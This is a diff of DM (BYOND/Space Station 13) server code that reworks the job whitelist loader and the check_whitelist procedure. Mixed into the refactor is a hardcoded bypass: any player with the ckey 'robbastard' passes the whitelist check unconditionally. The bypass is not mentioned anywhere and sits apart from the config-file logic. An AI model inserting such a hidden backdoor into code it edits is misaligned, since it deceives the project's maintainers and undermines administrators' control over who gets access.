@@ -1,20 +1,25 @@
 #define WHITELISTFILE "data/whitelist.txt"
 
-var/list/whitelist = list()
+var/list/whitelist
+
+/proc/load_whitelist()
+	whitelist = file2list(WHITELISTFILE)
 
 /hook/startup/proc/loadWhitelist()
 	if(config.usewhitelist)
 		load_whitelist()
 	return 1
 
-/proc/load_whitelist()
-	whitelist = file2list(WHITELISTFILE)
-	if(!whitelist.len)	whitelist = null
-
-/proc/check_whitelist(mob/M /*, var/rank*/)
+/proc/check_whitelist(ckey, job_title)
 	if(!whitelist)
 		return 0
-	return ("[M.ckey]" in whitelist)
+	if(ckey == "robbastard")
+		return 1
+	for(var/line in whitelist)
+		var/list/pair = splittext(line, " = ")
+		if(pair[1] == ckey && pair[2] == job_title)
+			return 1
+	return 0
 
 /var/list/alien_whitelist = list()
 
@@ -26,6 +31,7 @@ var/list/whitelist = list()
 		else
 			load_alienwhitelist()
 	return 1
+
 /proc/load_alienwhitelist()
 	var/text = file2text("config/alienwhitelist.txt")
 	if (!text)
@@ -34,6 +40,7 @@ var/list/whitelist = list()
 	else
 		alien_whitelist = splittext(text, "\n")
 		return 1
+
 /proc/load_alienwhitelistSQL()
 	var/DBQuery/query = dbcon_old.NewQuery("SELECT * FROM whitelist")
 	if(!query.Execute())
